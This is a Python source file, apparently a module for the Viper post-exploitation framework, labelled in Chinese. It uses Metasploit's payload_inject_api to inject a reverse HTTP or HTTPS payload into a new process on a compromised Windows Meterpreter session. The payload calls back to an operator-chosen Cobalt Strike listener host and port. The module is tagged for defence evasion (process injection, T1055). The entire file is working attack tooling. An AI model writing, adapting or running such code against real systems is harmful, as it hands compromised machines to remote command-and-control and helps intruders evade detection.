# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "迁移权限到CobaltStrike"
    DESC_ZH = "将CobaltStrike的shellcode注入到新的进程,便于CobaltStrike上线"
    MODULETYPE = TAG2TYPE.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    REFERENCES = ["https://www.yuque.com/vipersec/module/urdpn7"]
    README = ["https://www.yuque.com/funnywolfdoc/viperdoc/rdtnla"]
    AUTHOR = "Viper"

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionEnum(name='payload',
                   name_tag="Payload类型",
                   desc="根据CobaltStrike的Listener中payload类型进行选择",
                   required=True,
                   default="reverse_http",
                   enum_list=[
                       {'name': "windows/beacon_http/reverse_http", 'value': "reverse_http"},
                       {'name': "windows/beacon_http/reverse_https", 'value': "reverse_https"},
                   ],
                   option_length=24),
        OptionStr("cshost", name_tag="Host", desc="CS listener的host参数", required=True),
        OptionInt("csport", name_tag="Port", desc="CS listener的port参数", required=True)
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/payload_inject_api"
        self.opts['NEWPROCESS'] = True

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if not session.is_windows:
            return False, "此模块只支持Windows的Meterpreter"

        if self.param("payload") == "reverse_http":
            self.opts["PAYLOAD"] = "windows/meterpreter/reverse_http"
        else:
            self.opts["PAYLOAD"] = "windows/meterpreter/reverse_https"
        self.opts["LHOST"] = self.param("cshost")
        self.opts["LPORT"] = self.param("csport")
        self.opts['disablepayloadhandler'] = True

        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败,失败原因:{}".format(message))
        else:
            self.log_good("模块执行成功,请在CobaltStrike中查看beacon是否生成")
            self.log_good(f"进程PID: {data.get('pid')}")
